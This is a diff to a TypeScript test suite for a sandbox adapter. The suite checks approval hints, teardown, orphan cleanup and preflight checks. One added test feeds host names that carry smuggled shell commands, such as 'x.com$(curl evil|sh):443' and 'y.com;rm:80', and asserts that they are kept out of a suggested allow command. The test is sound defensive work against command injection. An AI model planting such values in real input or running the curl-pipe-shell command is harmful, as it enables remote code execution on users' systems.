@@ -135,6 +135,34 @@ describe("sbx adapter: inspect", () => {
     expect(r.approveHint).toBe("Review, then run yourself if you approve:\nsbx policy allow network a.example\nsbx policy allow network b.example");
   });
 
+  it("never puts a host with unexpected characters into a hint command, but keeps its denial", async () => {
+    const bad = "x.com$(curl evil|sh):443";
+    const log = { allowed: [], blocked: [{ host: bad }, { host: "y.com;rm:80" }, { host: "ok.example:443" }, { host: "[::1]:443" }] };
+    const f = fakeRunner(() => ok(JSON.stringify(log)));
+    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 0);
+    expect(r.denied).toEqual([
+      { kind: "network", target: bad },
+      { kind: "network", target: "y.com;rm:80" },
+      { kind: "network", target: "ok.example:443" },
+      { kind: "network", target: "[::1]:443" },
+    ]);
+    expect(r.approveHint).toBe(
+      [
+        "Review, then run yourself if you approve:",
+        "sbx policy allow network ok.example",
+        "sbx policy allow network [::1]",
+        `(not shown: a blocked host with unexpected characters; see sbx policy log ${N})`,
+      ].join("\n"),
+    );
+    expect(r.approveHint).not.toContain("curl");
+  });
+
+  it("only unexpected hosts: the hint is the heading plus the not-shown line", async () => {
+    const f = fakeRunner(() => ok(JSON.stringify({ allowed: [], blocked: [{ host: "a b:443" }] })));
+    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 0);
+    expect(r.approveHint).toBe(`Review, then run yourself if you approve:\n(not shown: a blocked host with unexpected characters; see sbx policy log ${N})`);
+  });
+
   it("a failed policy log call is an infra denial, never a throw", async () => {
     const f = fakeRunner(() => fail(1, "error: daemon down"));
     const r = await makeSbxAdapter({ run: f.run }).inspect(H, 125);
@@ -153,10 +181,10 @@ describe("sbx adapter: inspect", () => {
 });
 
 describe("sbx adapter: teardown", () => {
-  it("runs rm --force on the instance", async () => {
+  it("runs rm -f on the instance", async () => {
     const f = fakeRunner();
     await expect(makeSbxAdapter({ run: f.run }).teardown(H)).resolves.toBeUndefined();
-    expect(f.calls.map((c) => c.args)).toEqual([["rm", "--force", N]]);
+    expect(f.calls.map((c) => c.args)).toEqual([["rm", "-f", N]]);
   });
 
   it("a not-found stderr is done", async () => {
@@ -170,7 +198,7 @@ describe("sbx adapter: teardown", () => {
     const a = makeSbxAdapter({ run: f.run });
     await expect(a.teardown(H)).resolves.toBeUndefined();
     await expect(a.teardown(H)).resolves.toBeUndefined();
-    expect(f.calls.map((c) => c.args)).toEqual([["rm", "--force", N], ["rm", "--force", N]]);
+    expect(f.calls.map((c) => c.args)).toEqual([["rm", "-f", N], ["rm", "-f", N]]);
   });
 
   it("any other failure throws (spawn-claude logs it)", async () => {
@@ -186,8 +214,8 @@ describe("sbx adapter: cleanupOrphans", () => {
     await expect(makeSbxAdapter({ run: f.run }).cleanupOrphans({ prefix: "dl-1-a-" })).resolves.toBeUndefined();
     expect(f.calls.map((c) => c.args)).toEqual([
       ["ls", "--json"],
-      ["rm", "--force", "dl-1-a-x-1-dev-aaaaaa"],
-      ["rm", "--force", "dl-1-a-y-2-research-cccccc"],
+      ["rm", "-f", "dl-1-a-x-1-dev-aaaaaa"],
+      ["rm", "-f", "dl-1-a-y-2-research-cccccc"],
     ]);
   });
 
@@ -195,7 +223,7 @@ describe("sbx adapter: cleanupOrphans", () => {
     const list = [{ name: "dl-1-a-x-1-dev-aaaaaa" }, { name: "dl-3-a-b-x-1-dev-bbbbbb" }];
     const f = fakeRunner((args) => (args[0] === "ls" ? ok(JSON.stringify(list)) : ok()));
     await makeSbxAdapter({ run: f.run }).cleanupOrphans({ prefix: "dl-3-a-b-" });
-    expect(f.calls.map((c) => c.args)).toEqual([["ls", "--json"], ["rm", "--force", "dl-3-a-b-x-1-dev-bbbbbb"]]);
+    expect(f.calls.map((c) => c.args)).toEqual([["ls", "--json"], ["rm", "-f", "dl-3-a-b-x-1-dev-bbbbbb"]]);
   });
 
   it("a failed ls throws sbx ls failed", async () => {
@@ -244,7 +272,7 @@ describe("sbx adapter: preflight", () => {
     expect(f.calls.map((c) => c.args)).toEqual([
       ["create", "--name", P, "--no-progress", "--no-input", "claude", "--kit", kit, "/abs/root", "/abs/repo"],
       CHECK,
-      ["rm", "--force", P],
+      ["rm", "-f", P],
     ]);
     expect(f.calls[0].opts?.timeoutMs).toBe(CREATE_TIMEOUT_MS);
   });
@@ -280,7 +308,7 @@ describe("sbx adapter: preflight", () => {
     await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24 }).preflight(ctx())).rejects.toThrow(
       "sandbox image has no node 24: add node to the kit (see docs/sandbox-sbx.md)",
     );
-    expect(f.calls.at(-1)?.args).toEqual(["rm", "--force", P]);
+    expect(f.calls.at(-1)?.args).toEqual(["rm", "-f", P]);
   });
 
   it("refuses a missing node", async () => {
@@ -288,7 +316,7 @@ describe("sbx adapter: preflight", () => {
     await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24 }).preflight(ctx())).rejects.toThrow(
       "sandbox image has no node 24: add node to the kit (see docs/sandbox-sbx.md)",
     );
-    expect(f.calls.at(-1)?.args).toEqual(["rm", "--force", P]);
+    expect(f.calls.at(-1)?.args).toEqual(["rm", "-f", P]);
   });
 
   it("refuses when gh is not logged in, and still removes the instance", async () => {
@@ -296,7 +324,7 @@ describe("sbx adapter: preflight", () => {
     await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24 }).preflight(ctx())).rejects.toThrow(
       "gh is not logged in inside the sandbox: run sbx secret set github (see docs/sandbox-sbx.md)",
     );
-    expect(f.calls.at(-1)?.args).toEqual(["rm", "--force", P]);
+    expect(f.calls.at(-1)?.args).toEqual(["rm", "-f", P]);
   });
 
   it("any other exec failure is sbx preflight failed with the first stderr line", async () => {
@@ -304,7 +332,7 @@ describe("sbx adapter: preflight", () => {
     await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24 }).preflight(ctx())).rejects.toThrow(
       `sbx preflight failed: error: sandbox '${P}' not found`,
     );
-    expect(f.calls.at(-1)?.args).toEqual(["rm", "--force", P]);
+    expect(f.calls.at(-1)?.args).toEqual(["rm", "-f", P]);
   });
 
   it("a failed create is sbx preflight failed, and still removes the instance", async () => {
